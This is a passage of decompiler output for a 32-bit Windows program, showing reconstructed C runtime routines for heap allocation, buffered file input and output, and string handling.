      *(_DWORD *)(dword_493AD8 + 4) &= 0xFFFFFFFE;
      v22 = dword_493AD8;
    }
    if ( *(_DWORD *)(v22 + 8) == -1 )
    {
      VirtualFree(*(LPVOID *)(v22 + 12), 0, 0x8000u);
      HeapFree(hHeap, 0, *(LPVOID *)(dword_493AD8 + 16));
      sub_407FE0(
        dword_493AD8,
        (_BYTE *)(dword_493AD8 + 20),
        (unsigned int)lpMem + 20 * dword_493ADC - dword_493AD8 - 20);
      result = (int)a1;
      --dword_493ADC;
      if ( (unsigned int)a1 > dword_493AD8 )
        result = (int)(a1 - 5);
      dword_493AD4 = (int)lpMem;
    }
    else
    {
LABEL_46:
      result = (int)a1;
    }
    dword_493AD8 = result;
    dword_493AD0 = v4;
  }
  return result;
}
// 493AD0: using guessed type int dword_493AD0;
// 493AD4: using guessed type int dword_493AD4;
// 493AD8: using guessed type int dword_493AD8;
// 493ADC: using guessed type int dword_493ADC;

//----- (0040B909) --------------------------------------------------------
_DWORD *__cdecl __sbh_alloc_block(int a1)
{
  int v1; // ecx
  unsigned int v2; // esi
  char *i; // ebx
  bool v4; // zf
  bool v5; // zf
  bool v6; // zf
  _DWORD *v8; // eax
  int v9; // edx
  _DWORD *v10; // ecx
  int v11; // edx
  int v12; // edi
  int v13; // ecx
  int *v14; // edx
  int v15; // ecx
  int v16; // esi
  unsigned int v17; // ebx
  _BYTE *v18; // edi
  unsigned int v19; // ebx
  _BYTE *v20; // edi
  int v21; // ebx
  _DWORD *v22; // ecx
  char v23; // cl
  _DWORD *v24; // edx
  int v25; // [esp+Ch] [ebp-14h]
  int v26; // [esp+Ch] [ebp-14h]
  signed int v27; // [esp+10h] [ebp-10h]
  unsigned int v28; // [esp+14h] [ebp-Ch]
  _DWORD *v29; // [esp+14h] [ebp-Ch]
  unsigned int v30; // [esp+18h] [ebp-8h]
  int v31; // [esp+18h] [ebp-8h]
  char *v32; // [esp+1Ch] [ebp-4h]
  int v33; // [esp+1Ch] [ebp-4h]
  char *v34; // [esp+28h] [ebp+8h]

  v32 = (char *)lpMem + 20 * dword_493ADC;
  v27 = (a1 + 23) & 0xFFFFFFF0;
  v1 = (v27 >> 4) - 1;
  if ( v1 >= 32 )
  {
    v2 = 0;
    v28 = 0;
    v30 = 0xFFFFFFFF >> ((v27 >> 4) - 33);
  }
  else
  {
    v2 = 0xFFFFFFFF >> v1;
    v30 = -1;
    v28 = 0xFFFFFFFF >> v1;
  }
  i = (char *)dword_493AD4;
  v34 = (char *)dword_493AD4;
  if ( dword_493AD4 < (unsigned int)lpMem + 20 * dword_493ADC )
  {
    do
    {
      if ( v2 & *(_DWORD *)i | v30 & *((_DWORD *)i + 1) )
        break;
      i += 20;
      v34 = i;
    }
    while ( i < v32 );
  }
  if ( i == v32 )
  {
    for ( i = (char *)lpMem; ; i += 20 )
    {
      v4 = i == (char *)dword_493AD4;
      v34 = i;
      if ( (unsigned int)i >= dword_493AD4 )
        break;
      if ( v2 & *(_DWORD *)i | v30 & *((_DWORD *)i + 1) )
      {
        v4 = i == (char *)dword_493AD4;
        break;
      }
    }
    if ( v4 )
    {
      while ( 1 )
      {
        v5 = i == v32;
        if ( i >= v32 )
          break;
        if ( *((_DWORD *)i + 2) )
        {
          v5 = i == v32;
          break;
        }
        i += 20;
        v34 = i;
      }
      if ( v5 )
      {
        for ( i = (char *)lpMem; ; i += 20 )
        {
          v6 = i == (char *)dword_493AD4;
          v34 = i;
          if ( (unsigned int)i >= dword_493AD4 )
            break;
          if ( *((_DWORD *)i + 2) )
          {
            v6 = i == (char *)dword_493AD4;
            break;
          }
        }
        if ( v6 )
        {
          i = __sbh_alloc_new_region();
          v34 = i;
          if ( !i )
            return 0;
        }
      }
      **((_DWORD **)i + 4) = __sbh_alloc_new_group(i);
      if ( **((_DWORD **)i + 4) == -1 )
        return 0;
    }
  }
  dword_493AD4 = (int)i;
  v8 = (_DWORD *)*((_DWORD *)i + 4);
  v9 = *v8;
  v33 = *v8;
  if ( *v8 == -1 || !(v2 & v8[v9 + 17] | v30 & v8[v9 + 49]) )
  {
    v33 = 0;
    v10 = v8 + 17;
    v2 = v28;
    if ( !(v28 & v8[17] | v30 & v8[49]) )
    {
      do
      {
        v11 = v10[33];
        ++v33;
        ++v10;
      }
      while ( !(*v10 & v28 | v30 & v11) );
    }
    v9 = v33;
  }
  v12 = 0;
  v29 = &v8[129 * v9 + 81];
  v13 = v2 & v8[v9 + 17];
  if ( !v13 )
  {
    v13 = v30 & v8[v9 + 49];
    v12 = 32;
  }
  while ( v13 >= 0 )
  {
    v13 *= 2;
    ++v12;
  }
  v14 = (int *)v29[2 * v12 + 1];
  v31 = *v14 - v27;
  v15 = v31;
  v16 = (v31 >> 4) - 1;
  if ( v16 > 63 )
    v16 = 63;
  if ( v16 == v12 )
    goto LABEL_57;
  if ( v14[1] != v14[2] )
    goto LABEL_47;
  if ( v12 >= 32 )
  {
    v19 = 0x80000000 >> (v12 - 32);
    v20 = (char *)v8 + v12 + 4;
    v21 = ~v19;
    v8[v33 + 49] &= v21;
    v4 = (*v20)-- == 1;
    v26 = v21;
    if ( v4 )
    {
      i = v34;
      *((_DWORD *)v34 + 1) &= v26;
      goto LABEL_47;
    }
  }
  else
  {
    v17 = 0x80000000 >> v12;
    v18 = (char *)v8 + v12 + 4;
    v25 = ~v17;
    v8[v33 + 17] &= ~v17;
    v4 = (*v18)-- == 1;
    if ( v4 )
    {
      i = v34;
      *(_DWORD *)v34 &= v25;
      goto LABEL_47;
    }
  }
  i = v34;
LABEL_47:
  *(_DWORD *)(v14[2] + 4) = v14[1];
  *(_DWORD *)(v14[1] + 8) = v14[2];
  if ( v31 )
  {
    v22 = &v29[2 * v16];
    v14[1] = v22[1];
    v14[2] = (int)v22;
    v22[1] = v14;
    *(_DWORD *)(v14[1] + 8) = v14;
    if ( v14[1] == v14[2] )
    {
      v23 = *((_BYTE *)v8 + v16 + 4);
      if ( v16 >= 32 )
      {
        *((_BYTE *)v8 + v16 + 4) = v23 + 1;
        if ( !v23 )
          *((_DWORD *)i + 1) |= 0x80000000 >> (v16 - 32);
        v8[v33 + 49] |= 0x80000000 >> (v16 - 32);
      }
      else
      {
        *((_BYTE *)v8 + v16 + 4) = v23 + 1;
        if ( !v23 )
          *(_DWORD *)i |= 0x80000000 >> v16;
        v8[v33 + 17] |= 0x80000000 >> v16;
      }
    }
    v15 = v31;
LABEL_57:
    if ( v15 )
    {
      *v14 = v15;
      *(int *)((char *)v14 + v15 - 4) = v15;
    }
    goto LABEL_60;
  }
  v15 = 0;
LABEL_60:
  v24 = (int *)((char *)v14 + v15);
  *v24 = v27 + 1;
  *(_DWORD *)((char *)v24 + v27 - 4) = v27 + 1;
  v4 = (*v29)++ == 0;
  if ( v4 && i == (char *)dword_493AD8 && v33 == dword_493AD0 )
    dword_493AD8 = 0;
  *v8 = v33;
  return v24 + 1;
}
// 493AD0: using guessed type int dword_493AD0;
// 493AD4: using guessed type int dword_493AD4;
// 493AD8: using guessed type int dword_493AD8;
// 493ADC: using guessed type int dword_493ADC;

//----- (0040BC12) --------------------------------------------------------
char *__sbh_alloc_new_region()
{
  int v0; // eax
  void *v1; // eax
  char *v2; // esi
  LPVOID v3; // eax
  LPVOID v4; // eax

  v0 = dword_493ADC;
  if ( dword_493ADC == dword_493ACC )
  {
    v1 = HeapReAlloc(hHeap, 0, lpMem, 4 * (5 * dword_493ACC + 80));
    if ( !v1 )
      return 0;
    dword_493ACC += 16;
    lpMem = v1;
    v0 = dword_493ADC;
  }
  v2 = (char *)lpMem + 20 * v0;
  v3 = HeapAlloc(hHeap, 8u, 0x41C4u);
  *((_DWORD *)v2 + 4) = v3;
  if ( !v3 )
    return 0;
  v4 = VirtualAlloc(0, 0x100000u, 0x2000u, 4u);
  *((_DWORD *)v2 + 3) = v4;
  if ( !v4 )
  {
    HeapFree(hHeap, 0, *((LPVOID *)v2 + 4));
    return 0;
  }
  *((_DWORD *)v2 + 2) = -1;
  *(_DWORD *)v2 = 0;
  *((_DWORD *)v2 + 1) = 0;
  ++dword_493ADC;
  **((_DWORD **)v2 + 4) = -1;
  return v2;
}
// 493ACC: using guessed type int dword_493ACC;
// 493ADC: using guessed type int dword_493ADC;

//----- (0040BCC3) --------------------------------------------------------
int __cdecl __sbh_alloc_new_group(_DWORD *a1)
{
  int v1; // esi
  int v2; // eax
  int v3; // ebx
  int v4; // edx
  int v5; // eax
  _DWORD *v6; // edi
  _DWORD *v8; // eax

  v1 = a1[4];
  v2 = a1[2];
  v3 = 0;
  while ( v2 >= 0 )
  {
    v2 *= 2;
    ++v3;
  }
  v4 = 63;
  v5 = 516 * v3 + v1 + 324;
  do
  {
    *(_DWORD *)(v5 + 8) = v5;
    *(_DWORD *)(v5 + 4) = v5;
    v5 += 8;
    --v4;
  }
  while ( v4 );
  v6 = (_DWORD *)(a1[3] + (v3 << 15));
  if ( !VirtualAlloc(v6, 0x8000u, 0x1000u, 4u) )
    return -1;
  if ( v6 <= v6 + 7168 )
  {
    v8 = v6 + 4;
    do
    {
      *(v8 - 2) = -1;
      v8[1019] = -1;
      *(v8 - 1) = 4080;
      *v8 = v8 + 1023;
      v8[1] = v8 - 1025;
      v8[1018] = 4080;
      v8 += 1024;
    }
    while ( v8 - 4 <= v6 + 7168 );
  }
  *(_DWORD *)(516 * v3 + v1 + 832) = v6 + 3;
  v6[5] = 516 * v3 + v1 + 828;
  *(_DWORD *)(516 * v3 + v1 + 836) = v6 + 7171;
  v6[7172] = 516 * v3 + v1 + 828;
  *(_DWORD *)(v1 + 4 * v3 + 68) = 0;
  *(_DWORD *)(v1 + 4 * v3 + 196) = 1;
  if ( (*(_BYTE *)(v1 + 67))++ == 0 )
    a1[1] |= 1u;
  a1[2] &= ~(0x80000000 >> v3);
  return v3;
}

//----- (0040BDBE) --------------------------------------------------------
BOOL __cdecl sub_40BDBE(int a1)
{
  return dword_493ABC && dword_493ABC(a1);
}
// 493ABC: using guessed type int (__cdecl *dword_493ABC)(_DWORD);

//----- (0040BDD9) --------------------------------------------------------
int __cdecl mbtowc(wchar_t *lpWideCharStr, const char *lpMultiByteStr, size_t a3)
{
  unsigned __int8 v3; // al
  int result; // eax
  bool v5; // zf

  if ( !lpMultiByteStr || !a3 )
    return 0;
  v3 = *lpMultiByteStr;
  if ( !*lpMultiByteStr )
  {
    if ( lpWideCharStr )
      *lpWideCharStr = 0;
    return 0;
  }
  if ( !dword_49393C )
  {
    if ( lpWideCharStr )
      *lpWideCharStr = v3;
    return 1;
  }
  if ( off_412A10[0][v3] >= 0 )
  {
    if ( MultiByteToWideChar(dword_49394C, 9u, lpMultiByteStr, 1, lpWideCharStr, lpWideCharStr != 0) )
      return 1;
    goto LABEL_18;
  }
  result = cbMultiByte;
  if ( cbMultiByte > 1 )
  {
    if ( (int)a3 >= cbMultiByte )
    {
      v5 = MultiByteToWideChar(dword_49394C, 9u, lpMultiByteStr, cbMultiByte, lpWideCharStr, lpWideCharStr != 0) == 0;
      result = cbMultiByte;
      if ( !v5 )
        return result;
      goto LABEL_16;
    }
LABEL_18:
    dword_493954 = 42;
    return -1;
  }
LABEL_16:
  if ( a3 < result || !lpMultiByteStr[1] )
    goto LABEL_18;
  return result;
}
// 412A10: using guessed type __int16 *off_412A10[2];
// 493954: using guessed type int dword_493954;

//----- (0040BEF0) --------------------------------------------------------
int __usercall sub_40BEF0@<eax>(__int64 a1@<edx:eax>, unsigned __int8 a2@<cl>)
{
  __int64 v2; // rax

  if ( a2 >= 0x40u )
  {
    LODWORD(v2) = 0;
  }
  else if ( a2 >= 0x20u )
  {
    LODWORD(v2) = 0;
  }
  else
  {
    v2 = a1 << (a2 & 0x1F);
  }
  return v2;
}

//----- (0040BF0F) --------------------------------------------------------
int __cdecl _filbuf(FILE *File)
{
  int v1; // eax
  int v2; // eax
  int v3; // edx
  _BYTE *v4; // edi
  int v5; // ecx
  char *v6; // ecx
  int result; // eax

  v1 = File->_flag;
  if ( (v1 & 0x83) == 0 || (v1 & 0x40) != 0 )
    return -1;
  if ( (v1 & 2) != 0 )
  {
    LOBYTE(v1) = v1 | 0x20;
    File->_flag = v1;
    return -1;
  }
  LOBYTE(v1) = v1 | 1;
  File->_flag = v1;
  if ( (v1 & 0x10C) != 0 )
    File->_ptr = File->_base;
  else
    _getbuf(File);
  v2 = _read(File->_file, File->_base, File->_bufsiz);
  File->_cnt = v2;
  if ( !v2 || v2 == -1 )
  {
    File->_flag |= v2 != 0 ? 32 : 16;
    File->_cnt = 0;
    return -1;
  }
  v3 = File->_flag;
  if ( (v3 & 0x82) == 0 )
  {
    v4 = File->_file == -1 ? &unk_412CC8 : dword_494B20[File->_file >> 5] + 8 * (File->_file & 0x1F);
    if ( (v4[4] & 0x82) == 0x82 )
    {
      BYTE1(v3) |= 0x20u;
      File->_flag = v3;
    }
  }
  if ( File->_bufsiz == 512 )
  {
    v5 = File->_flag;
    if ( (v5 & 8) != 0 && (v5 & 0x400) == 0 )
      File->_bufsiz = 4096;
  }
  v6 = File->_ptr;
  File->_cnt = v2 - 1;
  result = (unsigned __int8)*v6;
  File->_ptr = v6 + 1;
  return result;
}
// 494B20: using guessed type int dword_494B20[];

//----- (0040BFE8) --------------------------------------------------------
int __cdecl ungetc_0(int Character, FILE *Stream)
{
  int v2; // eax
  int v4; // eax

  if ( Character == -1 )
    return -1;
  v2 = Stream->_flag;
  if ( (v2 & 1) == 0 && ((v2 & 0x80u) == 0 || (v2 & 2) != 0) )
    return -1;
  if ( !Stream->_base )
    _getbuf(Stream);
  if ( Stream->_ptr == Stream->_base )
  {
    if ( Stream->_cnt )
      return -1;
    ++Stream->_ptr;
  }
  if ( (Stream->_flag & 0x40) != 0 )
  {
    if ( *--Stream->_ptr != (_BYTE)Character )
    {
      ++Stream->_ptr;
      return -1;
    }
  }
  else
  {
    *--Stream->_ptr = Character;
  }
  v4 = Stream->_flag;
  ++Stream->_cnt;
  LOBYTE(v4) = v4 & 0xEF | 1;
  Stream->_flag = v4;
  return (unsigned __int8)Character;
}

//----- (0040C056) --------------------------------------------------------
int __cdecl sub_40C056(unsigned __int8 a1)
{
  return x_ismbbtype(a1, 0, 4u);
}

//----- (0040C067) --------------------------------------------------------
int __cdecl x_ismbbtype(unsigned __int8 a1, int a2, unsigned __int8 a3)
{
  int result; // eax

  if ( (a3 & (unsigned __int8)byte_494D61[a1]) != 0
    || (!a2 ? (result = 0) : (result = (unsigned __int16)(a2 & word_412A1A[a1])), result) )
  {
    result = 1;
  }
  return result;
}
// 412A1A: using guessed type __int16 word_412A1A[];

//----- (0040C098) --------------------------------------------------------
int __cdecl __crtMessageBoxA(int a1, int a2, int a3)
{
  int v3; // ebx
  HMODULE v4; // eax
  HMODULE v5; // edi

  v3 = 0;
  if ( !dword_493AC0 )
  {
    v4 = LoadLibraryA_0(aUser32Dll);
    v5 = v4;
    if ( !v4 )
      return 0;
    dword_493AC0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress_0(v4, aMessageboxa);
    if ( !dword_493AC0 )
      return 0;
    dword_493AC4 = GetProcAddress_0(v5, aGetactivewindo);
    dword_493AC8 = (int (__stdcall *)(_DWORD))GetProcAddress_0(v5, aGetlastactivep);
  }
  if ( dword_493AC4 )
  {
    v3 = dword_493AC4();
    if ( v3 )
    {
      if ( dword_493AC8 )
        v3 = dword_493AC8(v3);
    }
  }
  return dword_493AC0(v3, a1, a2, a3);
}
// 493AC0: using guessed type int (__stdcall *dword_493AC0)(_DWORD, _DWORD, _DWORD, _DWORD);
// 493AC4: using guessed type int (*dword_493AC4)(void);
// 493AC8: using guessed type int (__stdcall *dword_493AC8)(_DWORD);

//----- (0040C121) --------------------------------------------------------
_DWORD *__cdecl _dosmaperr(unsigned int a1)
{
  int v1; // edx
  _DWORD *result; // eax

  v1 = 0;
  dword_493958 = a1;
  result = &unk_413030;
  do
  {
    if ( a1 == *result )
    {
      result = (_DWORD *)dword_413034[2 * v1];
      dword_493954 = (int)result;
      return result;
    }
    result += 2;
    ++v1;
  }
  while ( (int)result < (int)&unk_413198 );
  if ( a1 < 0x13 || a1 > 0x24 )
  {
    if ( a1 < 0xBC || (dword_493954 = 8, a1 > 0xCA) )
      dword_493954 = 22;
  }
  else
  {
    dword_493954 = 13;
  }
  return result;
}
// 493954: using guessed type int dword_493954;
// 493958: using guessed type int dword_493958;

//----- (0040C188) --------------------------------------------------------
int __cdecl _free_osfhnd(int a1)
{
  int *v1; // edi
  int v2; // eax
  int result; // eax

  if ( a1 >= uNumber
    || (v1 = &dword_494B20[a1 >> 5], v2 = 8 * (a1 & 0x1F) + *v1, (*(_BYTE *)(v2 + 4) & 1) == 0)
    || *(_DWORD *)v2 == -1 )
  {
    dword_493958 = 0;
    dword_493954 = 9;
    result = -1;
  }
  else
  {
    if ( dword_412914 == 1 )
    {
      if ( a1 )
      {
        if ( a1 == 1 )
        {
          SetStdHandle(0xFFFFFFF5, 0);
        }
        else if ( a1 == 2 )
        {
          SetStdHandle(0xFFFFFFF4, 0);
        }
      }
      else
      {
        SetStdHandle(0xFFFFFFF6, 0);
      }
    }
    *(_DWORD *)(*v1 + 8 * (a1 & 0x1F)) = -1;
    result = 0;
  }
  return result;
}
// 412914: using guessed type int dword_412914;
// 493954: using guessed type int dword_493954;
// 493958: using guessed type int dword_493958;
// 494B20: using guessed type int dword_494B20[];

//----- (0040C202) --------------------------------------------------------
intptr_t __cdecl _get_osfhandle(int FileHandle)
{
  int v1; // eax

  if ( FileHandle < uNumber )
  {
    v1 = dword_494B20[FileHandle >> 5] + 8 * (FileHandle & 0x1F);
    if ( (*(_BYTE *)(v1 + 4) & 1) != 0 )
      return *(_DWORD *)v1;
  }
  dword_493958 = 0;
  dword_493954 = 9;
  return -1;
}
// 493954: using guessed type int dword_493954;
// 493958: using guessed type int dword_493958;
// 494B20: using guessed type int dword_494B20[];

//----- (0040C23F) --------------------------------------------------------
void *__cdecl calloc(size_t Count, size_t Size)
{
  unsigned int v2; // esi
  size_t v3; // ebx
  void *v4; // edi
  _DWORD *v5; // eax

  v2 = Size * Count;
  v3 = Size * Count;
  if ( Size * Count <= 0xFFFFFFE0 )
  {
    if ( !v2 )
      v2 = 1;
    v2 = (v2 + 15) & 0xFFFFFFF0;
  }
  do
  {
    v4 = 0;
    if ( v2 <= 0xFFFFFFE0 )
    {
      if ( v3 <= dword_413020 )
      {
        v5 = __sbh_alloc_block(v3);
        v4 = v5;
        if ( v5 )
        {
          memset(v5, 0, v3);
          return v4;
        }
      }
      v4 = HeapAlloc(hHeap, 8u, v2);
      if ( v4 )
        return v4;
    }
    if ( !dword_493AB8 )
      return v4;
  }
  while ( sub_40BDBE(v2) );
  return 0;
}
// 413020: using guessed type int dword_413020;
// 493AB8: using guessed type int dword_493AB8;

//----- (0040C314) --------------------------------------------------------
int __cdecl fflush(FILE *Stream)
{
  if ( !Stream )
    return flsall(0);
  if ( _flush(Stream) )
    return -1;
  if ( (Stream->_flag & 0x4000) != 0 )
    return -(_commit(Stream->_file) != 0);
  return 0;
}

//----- (0040C34F) --------------------------------------------------------
int __cdecl _flush(_DWORD *a1)
{
  int v1; // ebx
  const void *v2; // eax
  unsigned int v3; // edi
  int v4; // eax
  int v5; // eax

  v1 = 0;
  if ( (a1[3] & 3) == 2 && (a1[3] & 0x108) != 0 )
  {
    v2 = (const void *)a1[2];
    if ( *a1 - (int)v2 > 0 )
    {
      v3 = *a1 - (_DWORD)v2;
      if ( _write(a1[4], v2, v3) == v3 )
      {
        v4 = a1[3];
        if ( (v4 & 0x80u) != 0 )
        {
          LOBYTE(v4) = v4 & 0xFD;
          a1[3] = v4;
        }
      }
      else
      {
        a1[3] |= 0x20u;
        v1 = -1;
      }
    }
  }
  v5 = a1[2];
  a1[1] = 0;
  *a1 = v5;
  return v1;
}

//----- (0040C3AB) --------------------------------------------------------
int sub_40C3AB()
{
  return flsall(1);
}

//----- (0040C3B4) --------------------------------------------------------
int __cdecl flsall(int a1)
{
  signed int v1; // esi
  int v2; // ebx
  int i; // edi
  FILE *v4; // eax
  int v5; // ecx
  int result; // eax

  v1 = 0;
  v2 = 0;
  for ( i = 0; v1 < (int)Count; ++v1 )
  {
    v4 = *(FILE **)(dword_493AE4 + 4 * v1);
    if ( v4 )
    {
      v5 = v4->_flag;
      if ( (v5 & 0x83) != 0 )
      {
        if ( a1 == 1 )
        {
          if ( fflush(v4) != -1 )
            ++v2;
        }
        else if ( !a1 && (v5 & 2) != 0 && fflush(*(FILE **)(dword_493AE4 + 4 * v1)) == -1 )
        {
          i = -1;
        }
      }
    }
  }
  result = v2;
  if ( a1 != 1 )
    result = i;
  return result;
}
// 493AE4: using guessed type int dword_493AE4;

//----- (0040C421) --------------------------------------------------------
void sub_40C421()
{
  _amsg_exit(2u);
}

//----- (0040C42A) --------------------------------------------------------
int __cdecl _read(int a1, void *lpBuffer, unsigned int nNumberOfBytesToRead)
{
  int v3; // esi
  int *v4; // ebx
  int v5; // eax
  char v6; // dl
  char *v7; // edi
  char *v8; // ecx
  char v9; // al
  int v10; // eax
  unsigned int v11; // eax
  int v13; // eax
  char *v14; // ecx
  char v15; // al
  char v16; // al
  char *v17; // ecx
  bool v18; // cf
  char v19; // al
  char v20; // al
  _BYTE *v21; // esi
  DWORD NumberOfBytesRead; // [esp+Ch] [ebp-Ch] BYREF
  unsigned int v23; // [esp+10h] [ebp-8h]
  char Buffer; // [esp+17h] [ebp-1h] BYREF
  char *nNumberOfBytesToReada; // [esp+28h] [ebp+10h]

  if ( a1 >= uNumber
    || (v3 = 8 * (a1 & 0x1F), v4 = &dword_494B20[a1 >> 5], v5 = v3 + *v4, v6 = *(_BYTE *)(v5 + 4), (v6 & 1) == 0) )
  {
    dword_493958 = 0;
    dword_493954 = 9;
    return -1;
  }
  v23 = 0;
  v7 = (char *)lpBuffer;
  v8 = (char *)lpBuffer;
  if ( !nNumberOfBytesToRead || (v6 & 2) != 0 )
    return 0;
  if ( (v6 & 0x48) != 0 )
  {
    v9 = *(_BYTE *)(v5 + 5);
    if ( v9 != 10 )
    {
      --nNumberOfBytesToRead;
      *(_BYTE *)lpBuffer = v9;
      v10 = *v4;
      v8 = (char *)lpBuffer + 1;
      v23 = 1;
      *(_BYTE *)(v10 + v3 + 5) = 10;
    }
  }
  if ( ReadFile(*(HANDLE *)(*v4 + 8 * (a1 & 0x1F)), v8, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
  {
    v13 = *v4;
    v23 += NumberOfBytesRead;
    v14 = (char *)(v13 + v3 + 4);
    v15 = *v14;
    if ( *v14 < 0 )
    {
      if ( NumberOfBytesRead && *(_BYTE *)lpBuffer == 10 )
        v16 = v15 | 4;
      else
        v16 = v15 & 0xFB;
      *v14 = v16;
      nNumberOfBytesToReada = (char *)lpBuffer;
      v17 = (char *)lpBuffer + v23;
      v18 = lpBuffer < (char *)lpBuffer + v23;
      v23 += (unsigned int)lpBuffer;
      if ( v18 )
      {
        do
        {
          v19 = *nNumberOfBytesToReada;
          if ( *nNumberOfBytesToReada == 26 )
          {
            v21 = (_BYTE *)(*v4 + v3 + 4);
            if ( (*v21 & 0x40) == 0 )
              *v21 |= 2u;
            break;
          }
          if ( v19 == 13 )
          {
            if ( nNumberOfBytesToReada >= v17 - 1 )
            {
              ++nNumberOfBytesToReada;
              if ( !ReadFile(*(HANDLE *)(*v4 + 8 * (a1 & 0x1F)), &Buffer, 1u, &NumberOfBytesRead, 0) && GetLastError()
                || !NumberOfBytesRead )
              {
LABEL_37:
                *v7 = 13;
                goto LABEL_38;
              }
              if ( (*(_BYTE *)(*v4 + v3 + 4) & 0x48) != 0 )
              {
                v20 = Buffer;
                if ( Buffer == 10 )
                  goto LABEL_35;
                *v7++ = 13;
                *(_BYTE *)(*v4 + v3 + 5) = v20;
              }
              else
              {
                if ( v7 == lpBuffer && Buffer == 10 )
                  goto LABEL_35;
                _lseek(a1, -1, 1);
                if ( Buffer != 10 )
                  goto LABEL_37;
              }
            }
            else
            {
              if ( nNumberOfBytesToReada[1] == 10 )
              {
                nNumberOfBytesToReada += 2;
LABEL_35:
                *v7 = 10;
LABEL_38:
                ++v7;
                goto LABEL_39;
              }
              *v7++ = 13;
              ++nNumberOfBytesToReada;
            }
          }
          else
          {
            *v7++ = v19;
            ++nNumberOfBytesToReada;
          }
LABEL_39:
          v17 = (char *)v23;
        }
        while ( (unsigned int)nNumberOfBytesToReada < v23 );
      }
      v23 = v7 - (_BYTE *)lpBuffer;
    }
    return v23;
  }
  v11 = GetLastError();
  if ( v11 != 5 )
  {
    if ( v11 != 109 )
    {
      _dosmaperr(v11);
      return -1;
    }
    return 0;
  }
  dword_493954 = 9;
  dword_493958 = 5;
  return -1;
}
// 493954: using guessed type int dword_493954;
// 493958: using guessed type int dword_493958;
// 494B20: using guessed type int dword_494B20[];

//----- (0040C620) --------------------------------------------------------
int __cdecl fclose(FILE *Stream)
{
  int v1; // edi
  int v2; // eax
  int result; // eax

  v1 = -1;
  v2 = Stream->_flag;
  if ( (v2 & 0x40) != 0 )
  {
    result = -1;
  }
  else
  {
    if ( (v2 & 0x83) != 0 )
    {
      v1 = _flush(Stream);
      _freebuf(Stream);
      if ( _close(Stream->_file) >= 0 )
      {
        if ( Stream->_tmpfname )
        {
          free(Stream->_tmpfname);
          Stream->_tmpfname = 0;
        }
      }
      else
      {
        v1 = -1;
      }
    }
    result = v1;
  }
  Stream->_flag = 0;
  return result;
}

//----- (0040C676) --------------------------------------------------------
int __cdecl _commit(int FileHandle)
{
  void *v1; // eax
  int result; // eax

  if ( FileHandle >= uNumber || (*(_BYTE *)(dword_494B20[FileHandle >> 5] + 8 * (FileHandle & 0x1F) + 4) & 1) == 0 )
    goto LABEL_8;
  v1 = (void *)_get_osfhandle(FileHandle);
  if ( FlushFileBuffers(v1) )
    result = 0;
  else
    result = GetLastError();
  if ( result )
  {
    dword_493958 = result;
LABEL_8:
    dword_493954 = 9;
    result = -1;
  }
  return result;
}
// 493954: using guessed type int dword_493954;
// 493958: using guessed type int dword_493958;
// 494B20: using guessed type int dword_494B20[];

//----- (0040C6CD) --------------------------------------------------------
int __cdecl _close(int FileHandle)
{
  int v1; // esi
  intptr_t v2; // ebp
  void *v3; // eax
  unsigned int v4; // ebp

  if ( FileHandle < uNumber
    && (v1 = 8 * (FileHandle & 0x1F), (*(_BYTE *)(dword_494B20[FileHandle >> 5] + v1 + 4) & 1) != 0) )
  {
    if ( _get_osfhandle(FileHandle) == -1
      || (FileHandle == 1 || FileHandle == 2) && (v2 = _get_osfhandle(2), _get_osfhandle(1) == v2)
      || (v3 = (void *)_get_osfhandle(FileHandle), CloseHandle(v3)) )
    {
      v4 = 0;
    }
    else
    {
      v4 = GetLastError();
    }
    _free_osfhnd(FileHandle);
    *(_BYTE *)(dword_494B20[FileHandle >> 5] + v1 + 4) = 0;
    if ( !v4 )
      return 0;
    _dosmaperr(v4);
  }
  else
  {
    dword_493958 = 0;
    dword_493954 = 9;
  }
  return -1;
}
// 493954: using guessed type int dword_493954;
// 493958: using guessed type int dword_493958;
// 494B20: using guessed type int dword_494B20[];

//----- (0040C780) --------------------------------------------------------
void __cdecl _freebuf(_iobuf *stream)
{
  int v1; // eax

  v1 = stream->_flag;
  if ( (v1 & 0x83) != 0 && (v1 & 8) != 0 )
  {
    free(stream->_base);
    LOWORD(stream->_flag) &= 0xFBF7u;
    stream->_ptr = 0;
    stream->_base = 0;
    stream->_cnt = 0;
  }
}

//----- (0040C7C8) --------------------------------------------------------
char *__cdecl _strupr(char *String)
{
  char *result; // eax
  char *i; // edx
  char v3; // cl
  size_t v4; // eax
  int v5; // edi
  CHAR *v6; // eax
  CHAR *lpMem; // [esp+4h] [ebp-4h]

  lpMem = 0;
  if ( dword_49393C )
  {
    v4 = __crtLCMapStringA(dword_49393C, 0x200u, String, -1, 0, 0, 0, 1);
    v5 = v4;
    if ( v4 )
    {
      v6 = (CHAR *)sub_409613(v4);
      lpMem = v6;
      if ( v6 )
      {
        if ( __crtLCMapStringA(dword_49393C, 0x200u, String, -1, v6, v5, 0, 1) )
          sub_407750();
      }
    }
    free(lpMem);
    result = String;
  }
  else
  {
    result = String;
    for ( i = String; *i; ++i )
    {
      v3 = *i;
      if ( *i >= 97 && v3 <= 122 )
        *i = v3 - 32;
    }
  }
  return result;
}

//----- (0040C870) --------------------------------------------------------
int __cdecl _strnicmp(const char *String1, const char *String2, size_t MaxCount)
{
  int v3; // ecx
  unsigned __int8 v6; // ah
  unsigned __int8 v7; // al
  bool v8; // cf
  unsigned int v9; // eax
  unsigned int v10; // ebx
  bool v11; // cf
  int v13; // [esp-8h] [ebp-14h]
  int v14; // [esp-4h] [ebp-10h]

  v3 = MaxCount;
  if ( MaxCount )
  {
    if ( *((_DWORD *)&unk_493934 + 2) )
    {
      v9 = 0;
      v10 = 0;
      do
      {
        LOBYTE(v9) = *String1;
        LOBYTE(v10) = *String2;
        if ( !v9 || !v10 )
          break;
        ++String1;
        ++String2;
        v14 = v3;
        v13 = v9;
        v10 = tolower_0(v10);
        v9 = tolower_0(v13);
        v11 = v9 < v10;
        if ( v9 != v10 )
          goto LABEL_22;
        v3 = v14 - 1;
      }
      while ( v14 != 1 );
      v3 = 0;
      v11 = v9 < v10;
      if ( v9 == v10 )
        return v3;
LABEL_22:
      v3 = -1;
      if ( !v11 )
        v3 = 1;
    }
    else
    {
      do
      {
        v6 = *String1;
        v7 = *String2;
        if ( !*String1 || !v7 )
          break;
        ++String1;
        ++String2;
        if ( v6 >= 0x41u && v6 <= 0x5Au )
          v6 += 32;
        if ( v7 >= 0x41u && v7 <= 0x5Au )
          v7 += 32;
        v8 = v6 < v7;
        if ( v6 != v7 )
